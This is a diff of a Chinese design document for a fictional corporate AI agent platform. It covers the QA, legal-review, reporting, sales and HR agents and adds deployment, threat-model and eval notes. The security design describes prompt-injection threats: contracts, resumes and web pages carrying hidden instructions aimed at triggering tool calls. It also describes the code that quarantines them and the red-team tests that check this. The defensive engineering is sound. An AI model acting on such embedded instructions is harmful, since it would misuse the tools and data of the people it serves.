-| M2 | `agents/legal/`：输入的 `mode` 决定走四条路之一；纯文本由固定的代码规则映射。**审查**：接收（不可信 + 敏感）从三个来源之一取文本：用 `legal.get_contract` 读库里的合同、粘贴的文本（可以是对方改过的某份库内合同 `contract_id` 的版本）、或本人上传的文件。然后进入审查节点：它**不持有任何 MCP 工具**，也没有任何对外的东西。审查调用 `corpai.legal.review_contract(..., gateway=ctx.services.gateway)`；它的逐条款模型循环只有 Clause Check 自带的工具（`corpai/legal/clausecheck/tools.py`）：只读查询 `lookup_playbook` 和 `get_clause`（Playbook、同一份合同里的另一条款），以及 `propose_redline` / `mark_for_review`，后两个只记进这一条款的草稿状态，不改文档，也不碰任何系统。每次调用都必须走 `local`（hwm 至少 L3）。每条发现一个“已隔离，无任何效果”的提示。结果经 `legal.save_review` 存进 `legal.reviews`。这条路永远不提交提议。**到期**：只用 SQL，以用户身份（`corpai.legal.contracts_due`），不调模型。**起草**：代码用模板和 `legal.clause_library` 拼出文本；律师给了说明、又有没填的地方时，调一次本地模型（purpose `legal.draft`），只能填模板里没填的变量或选一条允许的备选条款，代码校验它的回答。拼好的文本原样提交 `create_contract_draft`（风险档 2）→ 审批。**发送**：律师单独发起的一次运行，参数由代码构造 → `legal.send_contract`（风险档 3，四眼）→ 审批。`initial_state` 每次清空本次运行的键，所以发送那次运行里没有合同正文 | 藏了注入的合同不会引发任何工具调用；“下月到期的合同”查询结果完全准确；C-0005 缺 DPA 被发现 |
-| M3 | `agents/report/`：**计划**：期间和语言由代码解析；输入里没写期间时，取模拟日期之前最近一个完整的季度。没结束的期间由 `refuse` 节点拒绝，`data = {kind: "management_report", refused: true}`。**五个领域并行取数**：请求人身份；只用已签核或已发布的快照（`signed_only=True`）；看不到的明确写“无权限”。每个领域还以请求人身份跑自己的问题检测（`corpai.metrics.signals`）：`dept_budget_overrun` 查报告自己的期间（月度报告查那个月）；`overdue_receivable`、`project_testing_delayed`、`hiring_over_budget`、`contract_expiring`、`missing_dpa_clause` 描述模拟日当天的状态。**写作**：没有工具；`corpai.metrics.write_report_text(..., gateway=ctx.services.gateway)`。模型写 `{metric:<key>[:<period>]}` 占位，代码替换后检查：每个数字（`verify_template`、`verify_numbers`）；用 `corpai/metrics/facts.py` 检查正文里每个编号和日期都在提示词里出现过（`verify_facts`）；每个可见的问题都按编号写到了（`missing_issues`）。模型最多写 2 次，第二次带上上一次的问题，再不过就用代码模板。**收尾**：表头、列出所有隐藏内容的附录、再校验一次数字，`data.export = {domain, allowed}`。导出不是图的节点：`POST`/`GET /api/reports/{run_id}/export`（§13）从调用者自己的 checkpoint 读回报告；水印级别取运行的 hwm、报告级别和正文自身分级三者的最大值。每次尝试都写 `export` 审计：策略允许或拒绝由 `aexport_report` 写，策略检查之前的拒绝由 `export_run` 写（不存在或别人的运行写 `not_found_or_not_own`，不能用报告的角色写 `may_not_run_reports`） | CEO 和 CTO 拿到的报告不同；每个数字都能追溯到 SQL；埋入的问题被发现；n<5 的分组不展示 |
+| M1 | `agents/qa.py`：分级 → 检索（用途 `qa`：public、general、legal_regs 和调用者本部门的集合。和问题没有任何共同实词（或中日韩字符二元组）的命中，在进入会话之前就丢掉。写给 AI 的段落被扣下，`_qa_guard.py`）→ 工具（最多 3 轮模型调用、每轮最多 4 次工具调用，只能从 qa Agent 的只读工具里选这个用户能用的；其他名字一律拒绝，并发出 `policy` `tool_not_offered` 事件；写给 AI 的工具结果会被标记）→ 回答（每个工具结果给模型看的形式是 `Tool <domain>.<tool> result, sources to cite: [doc:<id>] …`，正好是 `check_citations` 能匹配的标记；判断相关性时，公司名“ABC Tech”作为整个词组去掉，不再逐词去掉）→ 引用（代码只保留检索到的文档或工具来源的引用；L4 的引用不带摘录）。每次运行只有一个线路事件（回答那次调用的线路，也是最严格的） | 公开问题走 `external`；内部问题走 `local`；不同身份问同一个问题，返回的文档不同；打开宕机开关后 L3 请求报错，`external` 出口为 0。测试集：金丝雀、混沌、红队、路由样例（`tests/security`），黄金问题集（`evals/qa`），路由鲁棒性（`evals/routing`） |
+| M2 | `agents/legal/`：输入的 `mode` 决定走四条路之一；纯文本由固定的代码规则映射。**审查**：接收（不可信 + 敏感）从三个来源之一取文本：用 `legal.get_contract` 读库里的合同、粘贴的文本（可以是对方改过的某份库内合同 `contract_id` 的版本）、或本人上传的文件。然后进入审查节点：它**不持有任何 MCP 工具**，也没有任何对外的东西。审查调用 `corpai.legal.review_contract(..., gateway=ctx.services.gateway)`；它的逐条款模型循环只有 Clause Check 自带的工具（`corpai/legal/clausecheck/tools.py`）：只读查询 `lookup_playbook` 和 `get_clause`（Playbook、同一份合同里的另一条款），以及 `propose_redline` / `mark_for_review`，后两个只记进这一条款的草稿状态，不改文档，也不碰任何系统。每次调用都必须走 `local`（hwm 至少 L3）。每条发现一个“已隔离，无任何效果”的提示。每个条款的结论由代码定为可接受 / 备选 / 不可接受 / 缺失（`corpai/legal/review.py`）：有写给 AI 的指令（代码或模型发现；模型的标记只算正在审查的这一条款里的文字）、模型给出 flag 或 redline、或代码检查判为“超出 Playbook”，都是不可接受；模型接受了、但又调用了 `mark_for_review` 的条款（不是“超出”）是备选，附上模型的理由；缺失的 Playbook 条款，由模型按这同一条规则判为不可接受的那个条款承载，没有就由代码按关键词选的条款承载，再没有就单独列一条（问题记录第十五节，实时评测）。结果经 `legal.save_review` 存进 `legal.reviews`。这条路永远不提交提议。**到期**：只用 SQL，以用户身份（`corpai.legal.contracts_due`），不调模型。**起草**：代码用模板和 `legal.clause_library` 拼出文本；律师给了说明、又有没填的地方时，调一次本地模型（purpose `legal.draft`），只能填模板里没填的变量或选一条允许的备选条款，代码校验它的回答。拼好的文本原样提交 `create_contract_draft`（风险档 2）→ 审批。**发送**：律师单独发起的一次运行，参数由代码构造 → `legal.send_contract`（风险档 3，四眼）→ 审批。`initial_state` 每次清空本次运行的键，所以发送那次运行里没有合同正文 | 藏了注入的合同不会引发任何工具调用；“下月到期的合同”查询结果完全准确；C-0005 缺 DPA 被发现 |
+| M3 | `agents/report/`：**计划**：期间和语言由代码解析；输入里没写期间时，取模拟日期之前最近一个完整的季度。没结束的期间由 `refuse` 节点拒绝，`data = {kind: "management_report", refused: true}`。**五个领域并行取数**：请求人身份；只用已签核或已发布的快照（`signed_only=True`）；看不到的明确写“无权限”。每个领域还以请求人身份跑自己的问题检测（`corpai.metrics.signals`）：`dept_budget_overrun` 查报告自己的期间（月度报告查那个月）；`overdue_receivable`、`project_testing_delayed`、`hiring_over_budget`、`contract_expiring`、`missing_dpa_clause` 描述模拟日当天的状态。**写作**：没有工具；`corpai.metrics.write_report_text(..., gateway=ctx.services.gateway)`。模型写 `{metric:<key>[:<period>]}` 占位；提示词要求只写正文（标题、表头和附录由代码加）、先写全部问题，`max_tokens` 为 3000。代码替换后检查：每个数字（`verify_template`、`verify_numbers`；表的键名和指标的完整名称，如“赢单率（近 12 个月）”，算名称，不算数字）；用 `corpai/metrics/facts.py` 检查正文里每个编号和日期都在提示词里出现过（`verify_facts`）；每个可见的问题都按编号写到了（`missing_issues`）。模型最多写 2 次，第二次带上上一次的问题，再不过就用代码模板。**收尾**：表头、列出所有隐藏内容的附录、再校验一次数字，`data.export = {domain, allowed}`。导出不是图的节点：`POST`/`GET /api/reports/{run_id}/export`（§13）从调用者自己的 checkpoint 读回报告；水印级别取运行的 hwm、报告级别和正文自身分级三者的最大值。每次尝试都写 `export` 审计：策略允许或拒绝由 `aexport_report` 写，策略检查之前的拒绝由 `export_run` 写（不存在或别人的运行写 `not_found_or_not_own`，不能用报告的角色写 `may_not_run_reports`） | CEO 和 CTO 拿到的报告不同；每个数字都能追溯到 SQL；埋入的问题被发现；n<5 的分组不展示 |
 | M4 销售 | `agents/sales/`：画像分支：接收（只接受 L1 的公司名）→ 隔离的 `sales_web` 子图（只有 `web.search/fetch`，不存 checkpoint，输出固定的 `CompanyProfile`；L1 时带 `public_only` 走 `external`，用户调高级别时走本地）→ 打分（以用户身份读 CRM：意向分由代码算、匹配度、分级、Playbook；L3）→ 策略（本地；只用画像里的枚举和数字字段）。跟进分支（在已有画像的会话里输入 `/followup [CT-xxxxx]`）：起草邮件（本地）→ `crm.send_email` 提议（风险档 3）→ 审批 | 注入网页不起作用；分数用历史数据回测 |
 | M4 HR | `agents/hr/`（一个模块、三个应用，构建函数 `build_<app>_graph`）。`hr_headcount`：汇总（以用户身份调 `corpai.hr.headcount_summary`：公开部分 L2，人数来自 `hr.headcount_by_dept`；预算部分 L3，只有用户能读的行；hwm = 汇总的级别，用户级别是下限）→ 说明（只对公开部分调一次 `llm()`：L2 走外部，L3 走本地；说明里只要有数字，就换成代码写的固定说明，`note_source: code`）。`hr_screening`：接收（读任何东西之前先升到用户级别和 L3；没有 `CAND-` 编号 → 拒绝）→ 筛查（不可信 + 敏感，没有工具）。筛查调用 `corpai.hr.screen_candidate`：去掉受保护属性和身份信息；每条硬性条件一次不带工具的调用，hwm L3；只有引文是原文、且不在嵌入的指令里，满足 / 不满足 / 不确定的判断才成立；证据存进 `hr.screening_evidence`（L4），会话升到 L4。然后等人决定（interrupt `hr_decision`，只在存了证据时）→ 记录。`hr_candidates`：一个节点，只读，纯代码。HR 的三张图都不给输入文字分级：输入只用来挑编号或者直接忽略，从不发给模型 | 反事实简历对的结果完全相同；任何地方都没有分数、排名或推荐 |
 
@@ -948,13 +952,16 @@ Agent 白名单在 `config/agents.yaml`：`agents:` 下每个 Agent 有 `descrip
 
 ## 17. 如果真实部署
 
-计划写一份 `docs/real-deployment.md`，还没写（代码注释里已经指向它）。内容包括硬件选型、vLLM/SGLang 推理框架、网络隔离、Keycloak、OPA/Cedar 策略引擎、Langfuse 和 SLO，还要写清楚单进程演示版在哪些地方做法不同：
+见 [real-deployment.zh.md](real-deployment.zh.md)（[英文](real-deployment.md)；代码注释里指向它）。内容包括本地线路的推理服务和 GPU 选型（vLLM/SGLang）、外部线路和欧盟数据驻留、OIDC（Keycloak 或 Entra ID）和目录同步、OPA/Cedar 和现在的 Python 策略怎么取舍（RLS 保留）、数据库角色和连接数、密钥、WORM 审计锚点、可观测性、出口代理、备份和保留期限、成本和上线计划。也写清楚了单进程演示版在哪些地方做法不同：
 - 审计锚点要送到数据库主机写不了的、只能追加的存储上（`corpai/audit/anchor.py`）；
 - 合同上传要存进一张数据库表，沿用同样的“只有上传者”规则，而不是放在进程内存里（`corpai/agents/legal/uploads.py`）；
 - “每个会话同时只跑一个运行”的锁是按进程的（`corpai/agents/_runner.py`），多个 worker 需要共享的锁；
 - 指标刷新要做成月结之后的定时任务，而不是演示里的按钮（`corpai/api/routes_metrics.py`）。
 
-只写文档，不实现。
+只写文档，不实现。收尾阶段（2026-10-08）另外写的配套文档：
+- [threat-model.zh.md](threat-model.zh.md)（[英文](threat-model.md)）：资产、信任边界、威胁 T-01～T-34 及对应的控制和测试、OWASP LLM Top 10 对照、未解决的风险（OR-*）。
+- [../compliance/](../compliance/README.md)：虚构公司的 GDPR 文件（处理活动记录、简历筛选的 DPIA（含欧盟 AI 法案）、销售画像的 LIA、出口清单、保留期限表）。
+- [evals-live.md](evals-live.md)：用真实模型跑的评测，以及因此做的修改。
 
 ---
 
@@ -984,7 +991,7 @@ Agent 白名单在 `config/agents.yaml`：`agents:` 下每个 Agent 有 `descrip
 - ✅ 人名词典在 API 启动时加载，每次运行前按指纹检查并重载；OpenAI 兼容路由已挂上；管理员开关接口已有（§13）。
 - ✅ M4：用人经理通过 `hr_candidates` 查看自己岗位的候选人（D-14）。
 - ✅ `audit_read` 事件（迁移 101）；✅ `dept_stats` 最小分组（迁移 102）。
-- 📌 未做：能用 `code.create_ticket`/`code.comment_ticket` 的工单 Agent；`trace.spans` 的 `subject_ids`；`docs/real-deployment.md`（含审计锚点外送，§17）。
+- 📌 未做：能用 `code.create_ticket`/`code.comment_ticket` 的工单 Agent；`trace.spans` 的 `subject_ids`；`docs/real-deployment.md`（含审计锚点外送，§17）。→ 收尾阶段：`subject_ids` 已做（迁移 103，§9）；`real-deployment.md` 已写（§17）；工单 Agent 仍不做，有测试把“没人持有的写工具”固定下来（§6，问题记录 D-16）。
 
 ---
 
